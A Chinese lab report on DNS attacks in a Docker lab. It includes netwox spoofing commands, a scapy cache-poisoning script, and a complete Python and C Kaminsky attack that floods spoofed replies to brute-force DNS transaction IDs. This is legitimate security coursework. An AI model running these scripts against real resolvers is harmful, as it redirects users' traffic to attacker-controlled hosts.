[toc]

# 计算机网络安全实验二

## DNS协议漏洞利用实验

### docker使用

#### 建立实验环境

普通用户： seed 密码:dees
超级用户：root 密码：seedubuntu

Network(bridge)：10.10.10.0/24：

```bash
sudo docker network create --subnet=10.10.10.0/24 dnsnetwork
```

创建dns：

```bash
sudo docker run -it --name=dns --hostname=dns --net dnsnetwork --ip=10.10.10.2 "seedubuntu" /bin/bash
```

创建user：

```bash
sudo docker run -it --name=user --hostname=user --net dnsnetwork --ip=10.10.10.3 "seedubuntu" /bin/bash
```

创建dns：

```bash
sudo docker run -it --name=dns --hostname=dns --net dnsnetwork --ip=10.10.10.2 "seedubuntu" /bin/bash
```

我的ip：

```bash
Attacker：10.10.10.1
dns：10.10.10.2
user：10.10.10.3
网卡：br-29c63b220f5a
```

#### docker常用指令

打开或停止HostM：

```bash
sudo docker start/stop HostM
```

把HostM映射到bash中：

```bash
sudo docker exec -it HostM /bin/bash
```

查看当前docker有哪些：

```bash
sudo docker ps -a
```

关闭防火墙：

```bash
sudo iptables -F
```

主机和容器之间拷贝数据：

```bash
sudo docker cp 容器名称:路径 主机路径
sudo docker cp 主机路径 容器名称:路径
```

### 一些注意事项

1. 每次重启之后，`/etc/resolv.conf`会被改成原来的内容。
2. 修改BIND9的配置后，可以运行`sudo rndc flush`测试一下。当遇到`rndc: connect failed: 127.0.0.1#953: connection refused`报错时，说明bind9的配置项出错，此时可以找找改了哪里，把错误纠正。

<div STYLE="page-break-after: always;"></div>

### 设置本地 DNS 服务器

#### 配置用户计算机

修改user主机的`/etc/resolv.conf`文件，将服务器IP添加 为文件中的第一个 nameserver 条目，即此服务器将用作主 DNS 服务器，如下图所示：

![](https://gitee.com/shandianchengzi/picture-bed/raw/master/img/20220419143439.png)

完成配置用户计算机之后，使用 dig 命令获取任意网址的 IP 地址，可以看到回应来自于10.10.10.2。 如下图：

![](https://gitee.com/shandianchengzi/picture-bed/raw/master/img/20220419144122.png)

即user的配置成功。

#### 设置本地DNS服务器

编辑`/etc/bind/named.conf.options`：确认①`dump-file "/var/cache/bind/dump.db";`；②dnssec-validation auto被注释，dnssec-enable是no(关闭DNSSEC)；③端口号设置好。如下图所示，打开的时候已经配置好了：

![image-20220415193857453](C:/Users/12524/AppData/Roaming/Typora/typora-user-images/image-20220415193857453.png)

重启DNS服务器：

```bash
sudo service bind9 restart
```

然后再运行提权指令减少一些报错：

```bash
sudo chmod 777 /var/cache/bind/dump.db # 提高缓存文件的权限
sudo chmod 777 /etc/bind/rndc.key # 提高rndc的权限
```

服务器常用指令：

```bash
sudo rndc dumpdb -cache # 将缓存转储到特定文件
sudo rndc flush # 清除DNS缓存
```

在用户机上运行ping指令测试：

```bash
ping www.baidu.com
```

在Wireshark上查看ping命令触发的DNS查询。

![](https://gitee.com/shandianchengzi/picture-bed/raw/master/img/20220419145014.png)

前期发送了大量的DNS查询报文，递归查询。（对应蓝色部分）  
当ping通之后，不需要再进行DNS查询，因此直接从缓存中读取IP地址。（对应的是连续的粉红色部分）

#### 在本地 DNS 服务器中建一个区域

1. 创建区域：在dns中编辑`/etc/bind/named.conf.default-zones`，添加：

   ```bash
zone "example.com" {
        type master;
        file "/etc/bind/example.com.db";
};
zone "0.168.192.in-addr.arpa" {
        type master;
        file "/etc/bind/192.168.0.db";
};
   ```

2. 把文件从主机中移动到docker中：
   
   ```bash
   sudo docker cp 192.168.0.db dns:/etc/bind/ # 正向查找区域文件
   sudo docker cp example.com.db dns:/etc/bind/ # 反向查找区域文件
   ```
   
3. 重新启动BIND服务器：

   ```bash
sudo service bind9 restart
   ```

   ![](https://gitee.com/shandianchengzi/picture-bed/raw/master/img/20220419150206.png)

4. 用户机运行`dig www.example.com`进行测试授权域配置：

   ![](https://gitee.com/shandianchengzi/picture-bed/raw/master/img/20220419150121.png)

   观察IP地址，与设置的一样。

5. 用户机运行`dig www.baidu.com`进行测试非授权域配置：

   ![](https://gitee.com/shandianchengzi/picture-bed/raw/master/img/20220419150348.png)
   
   对于非授权域域名，也能够成功获得相应信息。
   
   实验环境配置完成。
   
<div STYLE="page-break-after: always;"></div>

### 修改主机文件（可略）

   修改/etc/hosts文件，添加：

   ```bash
   1.2.3.4 www.bank32.com
   ```

   用dig命令测试结果，发现修改主机文件确实不影响对www.bank32.com文件解析，如下图所示：

   ![image-20220415210143808](C:/Users/12524/AppData/Roaming/Typora/typora-user-images/image-20220415210143808.png)

   用ping命令测试修改结果，确实影响了，如下图所示：

   ![image-20220415210342182](C:/Users/12524/AppData/Roaming/Typora/typora-user-images/image-20220415210342182.png)

   用Web浏览器测试结果，这个需要到seed@VM中检验。因此把seed@VM的/etc/hosts也修改一下，测试结果如下。

   ![image-20220415210639635](C:/Users/12524/AppData/Roaming/Typora/typora-user-images/image-20220415210639635.png)

   如上图所示，解析的DesIP被修改成1.2.3.4。


<div STYLE="page-break-after: always;"></div>

netwox可参考：[DNS攻击 - Wsine - 博客园 (cnblogs.com)](https://www.cnblogs.com/wsine/p/5657163.html)，基本上就是实验内容。

<div STYLE="page-break-after: always;"></div>

### netwox实施DNS的用户响应欺骗攻击

攻击指令：

```bash
sudo netwox 105 -h "news.youtube.com" -H "101.102.103.104" -a "ns.youtube.com" -A "55.66.77.88" --filter "src host 10.10.10.3" --device "br-29c63b220f5a"
```

攻击的是user，注意一定要加上--device 网卡，否则filter参数会失效。

运行攻击指令，并在用户机上`dig news.youtube.com`触发。

在攻击机上可以看到伪造的响应：

![](https://gitee.com/shandianchengzi/picture-bed/raw/master/img/20220419151427.png)

在user上查看回应，与伪造的一致：

![](https://gitee.com/shandianchengzi/picture-bed/raw/master/img/20220419152152.png)

观察到得到错误的DNS返回，并且显示为指定的IP地址，也返回了查询网址的权威域名及其IP地址。结果符合预期，攻击成功。

令攻击机停止攻击，再次`dig news.youtube.com`，在user上显示：

![](https://gitee.com/shandianchengzi/picture-bed/raw/master/img/20220419152105.png)

此时返回的结果与真实结果一致。  
说明攻击的确实是DNS的用户响应，不影响DNS服务器的正常请求。

<div STYLE="page-break-after: always;"></div>

### netwox实施DNS的缓存中毒攻击

在攻击机上运行：

```bash
sudo netwox 105 -h "news.youtube.com" -H "101.102.103.104" -a "ns.youtube.com" -A "55.66.77.88" --filter "src host 10.10.10.2" --device "br-29c63b220f5a" --spoofip "raw" --ttl 600
```

意思是设置DNS响应包域名news.youtube.com对应IP地址为101.102.103.104，权威名称服务器ns.youtube.com对应的IP地址为55.66.77.88。

攻击的是DNS服务器的缓存，ttl生存时间代表缓存留存在DNS服务器上的时间600（秒）。spoofip参数选择raw，否则netwox将对被欺骗的IP地址也进行MAC地址欺骗，因为ARP查询响应的等待时间问题，实验有可能失败。

> 实际上，就算加了参数，在docker上做实验，但是在三台虚拟主机上做实验就必成功（亲测），还是有**很大的可能失败**。
>
> 以下是难得成功的一次截图。

1. 首先清空DNS缓存：

   ```bash
   sudo rndc flush
   ```

2. 为了提高攻击的成功率，添加对外访问的时延如下（其实就是DNS服务器对外访问慢一点，保证它优先收到攻击机的回应）：

   ```bash
   sudo tc qdisc add dev br-29c63b220f5a root netem delay 1s
   ```

3. 运行攻击命令，用`dig news.youtube.com`触发：

   ![](https://gitee.com/shandianchengzi/picture-bed/raw/master/img/20220419202743.png)

   观察到，攻击机成功嗅探到DNS服务器向上发出的DNS请求包，并伪造上层DNS服务器向其发送回复报文。

   在user上dig指令的结果：

   ![](https://gitee.com/shandianchengzi/picture-bed/raw/master/img/20220419203200.png)

   观察到IP地址、权威域名服务器地址被修改成期望的地址。

   同时用Wireshark抓包，得到如下结果：

   ![](https://gitee.com/shandianchengzi/picture-bed/raw/master/img/20220419203541.png)

   观察到，攻击机比真实DNS服务器提前一步发送DNS响应，从而导致DNS缓存中毒。

   转储并查看DNS服务器缓存，如下：

   ```bash
   sudo rndc dumpdb -cache
   sudo cat /var/cache/bind/dump.db | grep -E "google|youtube|example|attack"
   ```

   ![](https://gitee.com/shandianchengzi/picture-bed/raw/master/img/20220419203830.png)

4. 停止攻击后，再次用dig进行域名查询，观察到返回的结果与上述结果一致：

   ![](https://gitee.com/shandianchengzi/picture-bed/raw/master/img/20220419203110.png)

   可以通过时间、TTL来判断，确实是攻击前后发的两次不同的查询。

DNS缓存中毒成功。

<div STYLE="page-break-after: always;"></div>

### scapy实施DNS缓存中毒攻击

针对授权域Authority Section和附加域Additional Section的攻击脚本：

该脚本既将授权域改成了attacker32.com，也将附加域修改了。

```bash
from scapy.all import *

def spoof_dns(pkt):
  #pkt.show()
  if(DNS in pkt and 'www.example.net' in pkt[DNS].qd.qname):
    IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)

    UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)

    # The Answer Section
    Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A',ttl=259200, rdata='10.0.2.5')

    # The Authority Section
    NSsec1 = DNSRR(rrname='example.net', type='NS', ttl=259200, rdata='attacker32.com')
    NSsec2 = DNSRR(rrname='google.com', type='NS', ttl=259200, rdata='attacker32.com')

    # The Additional Section
    Addsec1 = DNSRR(rrname='attacker32.com', type='A', ttl=259200, rdata='1.2.3.4')
    Addsec2 = DNSRR(rrname='attacker32.cn', type='A', ttl=259200, rdata='5.6.7.8')

    # Construct the DNS packet
    DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1, qdcount=1, ancount=1, nscount=2, arcount=2, an=Anssec, ns=NSsec1/NSsec2, ar=Addsec1/Addsec2)

    # Construct the entire IP packet and send it out
    spoofpkt = IPpkt/UDPpkt/DNSpkt
    send(spoofpkt)

# Sniff UDP query packets and invoke spoof_dns().
pkt = sniff(filter='udp and dst port 53 and src host 10.10.10.2', prn=spoof_dns)
```

1. 运行攻击脚本，在user上使用`dig www.example.net`命令激发DNS查询，攻击脚本运行如下图：

   ![](https://gitee.com/shandianchengzi/picture-bed/raw/master/img/20220419204746.png)

2. user上返回结果如下图：

   ![](https://gitee.com/shandianchengzi/picture-bed/raw/master/img/20220419204929.png)

   与攻击脚本一致，授权域和附加域都被修改了。

3. 同时查看Wireshark的抓包结果，观察到发送的伪造报文：

   ![](https://gitee.com/shandianchengzi/picture-bed/raw/master/img/20220419205126.png)

4. 转储并查看DNS服务器缓存，结果如下：

   ![](https://gitee.com/shandianchengzi/picture-bed/raw/master/img/20220419205330.png)

   观察到，没有attacker32.cn的缓存记录，这是因为attacker32.cn没有出现在授权域中。

5. 停止攻击后，再次用dig进行域名查询，观察到返回的结果与上述结果一致：

   ![](https://gitee.com/shandianchengzi/picture-bed/raw/master/img/20220419205533.png)

   可以通过时间、TTL来判断，确实是攻击前后发的两次不同的查询。

   DNS缓存中毒成功。

6. 此时使用`dig mail.example.net`命令进行查询，根据Wireshark抓包结果得知，当再次进行相同域的DNS查询时，会首先对在缓存中的NS条目指定的域名服务器进行查询，如下图：

   ![](https://gitee.com/shandianchengzi/picture-bed/raw/master/img/20220419210225.png)

   因此，对附加域的攻击也是成功的。

<div STYLE="page-break-after: always;"></div>

### 远程 DNS 缓存中毒攻击

#### 实验环境配置

1. 在dns中编辑`/etc/bind/named.conf.default-zones`，注释掉之前配置的example.com区域。并添加假域名去展示实验效果：

   ```bash
   zone "ns.ssd.net" {
        type master;
        file "/etc/bind/ssd.net.db";
   };
   ```

2. 在dns中添加文件`/etc/bind/ssd.net.db`，并将以下内容放入其中：

   ```bash
   $TTL 604800
   @ IN SOA localhost. root.localhost. (
   	2 ; Serial
   	604800 ; Refresh
   	86400 ; Retry
   	2419200 ; Expire
   	604800 ) ; Negative Cache TTL
   @ IN NS ns.ssd.net.
   @ IN A 10.10.10.1
   ns IN A 10.10.10.1
   * IN A 10.10.10.1
   ```
   
   其中`ns.ssd.net`修改成自己的假域名，`10.10.10.1`修改成攻击机的IP。
   

在用户机上运行`ping ns.ssd.net`测试是否配置成功：

![](https://gitee.com/shandianchengzi/picture-bed/raw/master/img/20220420130209.png)

如图，已经配置成功了。

3. 在攻击机中配置DNS服务器，去回答example.com的查询。在攻击机中编辑`/etc/bind/named.conf`添加以下内容：

   ```bash
   zone "example.com" {
           type master;
           file "/etc/bind/example.com.zone";
   };
   ```

   然后创建文件`/etc/bind/example.com.zone`，添加以下内容：

   ```bash
   $TTL 3D
   @ IN SOA ns.example.com. admin.example.com (
   	2008111001
   	8H
   	2H
   	4W
   	1D )
   @ IN NS ns.ssd.net.
   @ IN A 1.1.1.1
   www IN A 1.1.1.2
   ns IN A 10.10.10.168
   * IN A 10.10.10.17
   ```

   注意：在配置完攻击机和服务机之后，可以运行`sudo rndc flush`测试一下。当遇到`rndc: connect failed: 127.0.0.1#953: connection refused`报错时，说明bind9的配置项出错，此时可以找找改了哪里，把错误纠正。

   等到攻击成功后，www.example.com对应的是`1.1.1.2`。

4. 将之前实验添加的网络时延规则删除：

   ```bash
   sudo tc qdisc del dev br-29c63b220f5a root 
   ```

5. 其他配置不变。刷新缓存，重启dns和攻击机上的DNS服务器：

   ```bash
   sudo rndc flush
   sudo service bind9 restart
   ```

   在user上多次运行`dig www.example.com`，直到得到结果：

   ![](https://gitee.com/shandianchengzi/picture-bed/raw/master/img/20220420123030.png)

   如果能得到结果，说明环境配置成功。

   观察返回的信息，可以知道www.example.com的远程请求过程：①user向dns发起询问，DNS服务器依次查询；②先查到根域名服务器的地址；③再通过根域名服务器得到.com顶级域名服务器的地址；④再通过.com顶级域名服务器查询得到example.com权威域名服务器的地址；⑤通过询问example.com权威域名服务器，得到www.example.com的IP地址为93.184.216.34。

#### 攻击原理

当dns中已经有example.com的缓存信息时，它不再从根域名服务器查起，而是直接询问example.com。攻击机可以想Apollo发送伪造的响应，比真正的example.com先一步到达dns即可。

但是由于dns缓存有较长时间，攻击机想要等待服务器主动发起对指定域名的DNS请求需要时间。Dan Kaminsky提出了一种攻击方法去避免这个问题，该方法的步骤是：

①攻击者查询example.com随机的不存在的名称；  
②dns服务器缓存中没有这一域名，因此向example.com发起请求；  
③攻击机针对请求发送DNS欺骗流，不仅为该域名提供Answer，还将ns.姓名.net作为example.com域的权威域名服务器，从而破坏缓存。  

#### 攻击过程

两个攻击脚本：

伪造请求包和响应包的python程序general_dns.py：

```python
from scapy.all import *
import string
import random

# random name
name = ''.join(random.sample(string.ascii_letters, 5))+'.example.com' 
print(name)
Qdsec = DNSQR(qname=name)

# query
ip_q  = IP(dst='10.10.10.2',src='10.10.10.1') # dst: dns; src:attacker
udp_q = UDP(dport=53,sport=33333,chksum=0)
dns_q = DNS(id=0xaaaa,qr=0,qdcount=1,ancount=0,nscount=0,arcount=0,qd=Qdsec)
pkt_q= ip_q/udp_q/dns_q

# reply
ip_r = IP(dst='10.10.10.2', src='199.43.135.53', chksum=0)
udp_r = UDP(dport=33333, sport=53, chksum=0)
Anssec = DNSRR(rrname=name, type='A', rdata='1.2.3.4', ttl=259200)
 # The Authority Section
NSsec = DNSRR(rrname='example.com', type='NS', ttl=259200, rdata='ns.ssd.net')
Addsec = DNSRR(rrname='ns.ssd.net', type='A', ttl=259200, rdata='10.10.10.1')
dns_r = DNS(id=0xAAAA, aa=1, rd=0, qr=1, qdcount=1, ancount=1, nscount=1, arcount=1, qd=Qdsec, an=Anssec, ns=NSsec, ar=Addsec)
pkt_r = ip_r/udp_r/dns_r

with open('query.bin','wb')as f:
  f.write(bytes(pkt_q))
with open('reply.bin', 'wb') as f:
  f.write(bytes(pkt_r))
```

其中响应包的id要随机生成，发送从0~ffff号的所有报文来进行DNS欺骗。

用bless查看构造的reply.bin的二进制，找到id的偏移地址：

![](https://gitee.com/shandianchengzi/picture-bed/raw/master/img/20220421091116.png)

偏移量为0x1c，十进制为28。

攻击程序dns_attack.c的编写逻辑：

1. 每轮循环开始，先运行一次伪造请求包和响应包的python程序；
2. 打开`query.bin`和`reply.bin`，写入缓存区。
3. 发送DNS请求包；
4. 修改`reply.bin`的dns序列号，从1000~65535(观察了一下，发包速度相当快，可以支持多发一些包)，转换成大端字节序再写入(也可以不转)。并重新计算dns的chksum。
5. 依次发送这些DNS响应包。再回到1重新循环。

发包的C程序dns_attack.c：

```c
// ----udp.c------
// This sample program must be run by root lol!
//
// The program is to spoofing tons of different queries to the victim.
// Use wireshark to study the packets. However, it is not enough for
// the lab, please finish the response packet and complete the task.
//
// Compile command:
// gcc -lpcap dns_attack.c -o dns_attack
//
//

#include <unistd.h>
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <fcntl.h>
#include <string.h>
#include <errno.h>
#include <stdlib.h>
#include <libnet.h>
// The packet length
#define PCKT_LEN 8192
#define FLAG_R 0x8400
#define FLAG_Q 0x0100

// Can create separate header file (.h) for all headers' structure
// The IP header's structure
struct ipheader
{
    unsigned char iph_ihl : 4, iph_ver : 4;
    unsigned char iph_tos;
    unsigned short int iph_len;
    unsigned short int iph_ident;
    //    unsigned char      iph_flag;
    unsigned short int iph_offset;
    unsigned char iph_ttl;
    unsigned char iph_protocol;
    unsigned short int iph_chksum;
    unsigned int iph_sourceip;
    unsigned int iph_destip;
};

// UDP header's structure
struct udpheader
{
    unsigned short int udph_srcport;
    unsigned short int udph_destport;
    unsigned short int udph_len;
    unsigned short int udph_chksum;
};
struct dnsheader
{
    unsigned short int query_id;
    unsigned short int flags;
    unsigned short int QDCOUNT;
    unsigned short int ANCOUNT;
    unsigned short int NSCOUNT;
    unsigned short int ARCOUNT;
};
// This structure just for convinience in the DNS packet, because such 4 byte data often appears.
struct dataEnd
{
    unsigned short int type;
    unsigned short int class;
};
// total udp header length: 8 bytes (=64 bits)

unsigned int checksum(uint16_t *usBuff, int isize)
{
    unsigned int cksum = 0;
    for (; isize > 1; isize -= 2)
    {
        cksum += *usBuff++;
    }
    if (isize == 1)
    {
        cksum += *(uint16_t *)usBuff;
    }
    return (cksum);
}

// calculate udp checksum
uint16_t check_udp_sum(uint8_t *buffer, int len)
{
    unsigned long sum = 0;
    struct ipheader *tempI = (struct ipheader *)(buffer);
    struct udpheader *tempH = (struct udpheader *)(buffer + sizeof(struct ipheader));
    struct dnsheader *tempD = (struct dnsheader *)(buffer + sizeof(struct ipheader) + sizeof(struct udpheader));
    tempH->udph_chksum = 0;
    sum = checksum((uint16_t *)&(tempI->iph_sourceip), 8);
    sum += checksum((uint16_t *)tempH, len);

    sum += ntohs(IPPROTO_UDP + len);

    sum = (sum >> 16) + (sum & 0x0000ffff);
    sum += (sum >> 16);

    return (uint16_t)(~sum);
}
// Function for checksum calculation. From the RFC,
// the checksum algorithm is:
//  "The checksum field is the 16 bit one's complement of the one's
//  complement sum of all 16 bit words in the header.  For purposes of
//  computing the checksum, the value of the checksum field is zero."

unsigned short csum(unsigned short *buf, int nwords)
{
    unsigned long sum;
    for (sum = 0; nwords > 0; nwords--)
        sum += *buf++;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

void send_pkt(char* buffer, int pkt_size)
{
  struct sockaddr_in dest_info;
  int enable=1;
  
  int sock=socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
  
  setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable));
  
  struct ipheader *ip = (struct ipheader *)buffer;
  struct udpheader *udp = (struct udpheader *) (buffer + sizeof(struct ipheader));

  dest_info.sin_family = AF_INET;
  dest_info.sin_addr.s_addr = ip->iph_destip;
  
  udp->udph_chksum=check_udp_sum(buffer, pkt_size-sizeof(struct ipheader));
  if(sendto(sock, buffer, pkt_size, 0, (struct sockaddr *)&dest_info, sizeof(dest_info)) < 0){
		printf("packet send error %d which means %s\n",errno,strerror(errno));
	}
  close(sock);
}

int main(int argc, char *argv[])
{
    
    ////////////////////////////////////////////////////////////////////////
    // dns fields(UDP payload field)
    // relate to the lab, you can change them. begin:
    ////////////////////////////////////////////////////////////////////////
    
    while(1)
    {
      system("sudo python general_dns.py"); // random pkt
      
      // read pkt
      FILE * f_q = fopen("query.bin","rb");
      char q_buffer[PCKT_LEN];
      int q_n = fread(q_buffer, 1, PCKT_LEN, f_q);
      send_pkt(q_buffer, q_n);
      
      FILE * f_r = fopen("reply.bin","rb");
      char r_buffer[PCKT_LEN];
      int r_n = fread(r_buffer, 1, PCKT_LEN, f_r);
      
      for(unsigned short i=10000;i<65535;i++){ //random id:1000~2000
        unsigned short order=htons(i); //little->big
        memcpy(r_buffer+28,&order,2);
        send_pkt(r_buffer, r_n);
      }
    }

    /////////////////////////////////////////////////////////////////////
    //
    // DNS format, relate to the lab, you need to change them, end
    //
    //////////////////////////////////////////////////////////////////////

    return 0;
}
```

编译程序的方式：

```bash
gcc -lpcap dns_attack.c -o dns_attack
```

1. 编译并运行发包攻击程序，过一会儿在dns上转储cache，运行：

   ```bash
   sudo rndc dumpdb -cache
   sudo cat /var/cache/bind/dump.db | grep -E "google|youtube|example|attack|ssd"
   ```

   ![](https://gitee.com/shandianchengzi/picture-bed/raw/master/img/20220421220850.png)

   可以看到example.com现在对应的是ns.ssd.net，其他的被注释掉了，IP也解析成攻击目标了，相当成功。

   再观察一下Wireshark的报文：

   ![](https://gitee.com/shandianchengzi/picture-bed/raw/master/img/20220421221509.png)

   能看到伪造的随机请求包，也可以看到服务器收到伪造的请求包，开始主动向权威域名服务器请求，还可以看到伪造的序号顺序的响应。

   只要序号符合0xe0fa，并且比真实服务器早，就可以攻击成功。

   ![](https://gitee.com/shandianchengzi/picture-bed/raw/master/img/20220421221808.png)

   过滤`10.10.10.1`的报文，除了这些报文以及服务器的主动请求之外，其他的报文就是攻击机伪造的请求。可以看到攻击成功的可能性很大。

   > 注意：已经攻击完成后，**一定要及时中止`dns_attack`程序**。我在已经集齐所有完美的实验现象之后，忘记中止攻击程序，然后发送了过多的攻击报文，我自己的sock崩溃了。随后虚拟机内存不够，自动关机重启，还好我有快照，否则我也会崩溃了。

2. 此时在用户机上运行`dig www.example.com`、`dig abcd.example.com`去测试：

   ![](https://gitee.com/shandianchengzi/picture-bed/raw/master/img/20220421222907.png)

   可以看到，域名成功地被解析成预期值`1.1.1.2`了！

   然后随便攻击一个example.com域的域名，也可以成功解析成预期值：

   ![](https://gitee.com/shandianchengzi/picture-bed/raw/master/img/20220421223020.png)

   因此攻击成功。

<div STYLE="page-break-after: always;"></div>

### 心得体会

1. 实验过程非常充实，循序渐进，确实很有收获。  
   主要是了解DNS报文的伪造，实施DNS响应和缓存中毒攻击。

   整个过程，一是熟悉了netwox和scapy这两个工具。二是了解了DNS报文的作用和域名解析过程、授权域和附加域的使用和伪造，也综合各种知识，实施了Kaminsky攻击。

2. 实验建议：减少内容量。我想了很久，前面的几个实验究竟是否是必要的。如果没有前面的铺垫，我根本无法理解Kaminsky攻击。但是如果我能实现Kaminsky攻击，并理解它，做前面的scapy实验绝对不难。

   因此，这些实验任务中，我认为可以去掉scapy实施缓存中毒攻击的检查，但是不删除该部分的指导书。也可以把这一部分直接解释为DNS查询和请求的报文构造。

3. 还有可以补充的实验注意事项：比如，当遇到`rndc: connect failed: 127.0.0.1#953: connection refused`报错时，说明bind9的配置项出错，此时可以找找改了哪里，把错误纠正。

   netwox缓存中毒实验成功的概率较低，应该写在指导书该实验部分。即使增加网络延迟、使用外网域名，成功的概率都较低，这一点应该明确指出。我已经明确地观察到自己伪造的攻击报文先于真实服务器，但是这个攻击仍然没成功，有时候是因为参数对不上，但netwox并没有提供修改DNS报文参数的方法。（不过，如果使用多台虚拟机，一般就会成功。）

